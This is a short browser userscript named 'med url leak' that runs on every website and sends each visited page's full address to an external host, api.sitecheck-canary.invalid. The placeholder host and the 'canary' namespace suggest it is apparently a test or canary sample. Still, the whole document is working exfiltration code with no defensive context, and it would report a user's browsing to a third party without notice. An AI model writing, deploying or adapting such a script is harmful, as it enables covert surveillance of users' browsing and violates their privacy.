// ==UserScript==
// @name         med url leak
// @namespace    canary.invalid
// @version      1.0
// @match        *://*/*
// @grant        GM_xmlhttpRequest
// @connect      api.sitecheck-canary.invalid
// ==/UserScript==
GM_xmlhttpRequest({method: "GET", url: "https://api.sitecheck-canary.invalid/lookup?u=" + encodeURIComponent(location.href), onload: r => console.log(r.status)});
